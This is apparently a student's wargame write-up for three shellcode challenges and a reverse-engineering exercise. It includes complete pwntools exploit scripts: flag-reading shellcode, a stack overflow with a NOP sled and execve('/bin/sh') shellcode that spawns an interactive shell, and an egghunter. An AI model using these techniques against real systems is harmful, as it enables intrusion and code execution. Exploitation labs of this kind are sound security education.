# Simple

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaW1wbGUiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiY2Q3YjE1MDItZGJmMC00NzRmLWJiNGItMTI0MWEyZjczN2JhIn0.IcDggSIW0SdDjzx8dRsvnLcx7zbdJ6mvhEp--nXl_IA}

## Scenario

The flag is opened with fd 1000, and our input shellcode is executed

## Solution

Write shellcode to use the read syscall to store the flag into our buffer (esp).  
Then write shellcode to print the flag from the buffer

## Script

```python3
from pwn import *
import re

# p = process("./simple")
p = remote('plsdonthaq.me', 3001)

assembly = f"""
    # read 100 bytes from from fd 1000 to esp
    mov eax, 0x03    # syscall 3: read
    mov ebx, 1000    # open FD 1000
    mov ecx, esp     # Read into ESP
    mov edx, 100     # Read 100 bytes
    int 0x80         # sycall

    # print n bytes from esp
    mov edx, eax     # print n bytes
    mov eax, 0x04    # syscall 4: write
    mov ebx, 0x01    # fd 1: stdout
    # mov ecx, esp   # Read from ESP
    int 0x80         # syscall
"""

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))

p.recvuntil("enter your shellcode:")
p.sendline(payload)
p.recvuntil("jumping to shellcode\n")
print(p.recvline(keepends=False))
```

---

# Shellz

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaGVsbHoiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiMjdmZjVlZGYtMmRmNS00MTk4LTk2MzQtNTg2ZmRjMzc4ODgwIn0.3gX63Ng0-Z76Kmt937qeTbW_M1MOzLOc6azguHaerSg}

## Scenario

We are given a buffer `0x2004` away from ebp, and a random address in the stack.  
We need to get a shell.

## Solution

To jump into our shellcode, we need to overwrite the return address by padding `0x2008` bytes.  
In our pad, we also need to write our shellcode which will setup a syscall for `execve("/bin/sh", NULL, NULL)`.  

For some reason, using `push` to store the string didn't work, so I ended up storing the string into the buffer during runtime

## Script

```python3
from pwn import *
import re

# p = process("./shellz")
p = remote('plsdonthaq.me', 3002)

p.recvuntil(b"Here is a random stack address: ")
stackAddress = int(p.recvline(keepends=False), 16)
print("Stack address:", hex(stackAddress), "->", p32(stackAddress))

assembly = f"""
   # Test our shellcode is running
   # mov eax, 1
   # mov ebx, 99
   # int 0x80

   # Store "/bin/sh" at the start of the buffer
   # push didn't work for some reason
   mov ebx, {stackAddress}
   mov edx, 0x6e69622f
   mov [ebx], edx
   mov edx, 0x0068732f
   mov [ebx+4], edx

   # Set up syscall for execve("/bin/sh", NULL, NULL)
   mov eax, 0x0b
   # mov ebx, {stackAddress}
   mov ecx, 0
   mov edx, 0
   int 0x80
"""

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))

#                     Christmas                 + Payload + Return address
payload = (b'\x90' * (0x2008 - len(payload))) + payload + p32(stackAddress)

p.sendline(payload)
p.interactive()
```

---

# Find-Me

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1maW5kLW1lIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6ImMzNDBmNzM2LWU2OTQtNDViMi1hZjU3LWI3ODBiNTJhNGJiMCJ9.zZls9ldpV-Dh-3mz1pg09qEJ_VetUeR3Knu9FgYWdqA}

## Scenario

We are given two buffers (0x14 and 0x100 bytes), of which the first buffer is executed.  
This would give us only 19 bytes (20 bytes, inclusive of a NULL terminator) to write a piece shellcode that would be around 36 bytes long!

## Solution

Write an egghunter (at most 19 bytes long) to find the address bigger buffer, where we can write our shellcode.  
The bigger buffer would read from fd 1000 and print out the flag

## Script

```python3
# smallBuf -> 0x14 (20) bytes
# bigBuff -> 0x100 bytes

from pwn import *
import re

# p = process("./find-me")
p = remote('plsdonthaq.me', 3003)

p.recvuntil(b"new stack ")
stackAddress = int(p.recvline(keepends=False), 16)
print("Stack address:", hex(stackAddress), "->", p32(stackAddress))

assembly = f"""
mov eax, {stackAddress}   # Search from the stack address
mov ebx, 0x11223344       # Check for this signature
loop:
   inc eax                # Increment memory address
   cmp [eax-4], ebx       # Compare value at address to signature
   jne loop               # Loop if no match
   
   push eax               # Prepare jump to address eax
   ret                    # Go go go!
"""

####################################################################

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))
p.sendline(payload)

assembly = f"""
   # Test our shellcode is running
   # Should return with status code 99
      # mov eax, 1
      # mov ebx, 99
      # int 0x80

   # Read from fd 1000 into the stack memory
   mov eax, 0x03             # syscall 3: read
   mov ebx, 1000             # open FD 1000
   mov ecx, {stackAddress}   # Read into stack
   mov edx, 100              # Read 100 bytes
   int 0x80                  # sycall

   # Print from the stack memory
   mov edx, eax              # Print n bytes
   mov eax, 0x04             # syscall 4: write
   mov ebx, 0x01             # fd 1: stdout
   # mov ecx, esp            # Read from stack
   int 0x80                  # syscall
"""

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))
p.sendline(b"\x11\x22\x33\x44"[::-1] + payload)
p.recvuntil("jumping to smallbuf\n")
print(p.recvline(keepends=False))
```

---

# Reverse Engineering

The function `main` creates a loop over a counter (initially 0). The loop increments by 1 until it reaches 10. During the loop, if the current number is odd (LSB is 1), then the number is printed out with printf. The program returns with the status code `1`.

The format string of printf is not disclosed, and we will assume it to be `"%d\n"`

> gcc -m32 reversing.c

```c
#include <stdio.h>

int main(int argc) {
    int var_14 = 0;

    while (var_14 <= 9) {
        // Print if odd
        if (var_14 & 1) {
            // Don't know what the print string is
            // But we know it prints out var_14
            printf("%d\n", var_14);
        }

        var_14++;
    }

    return 1;
}
```
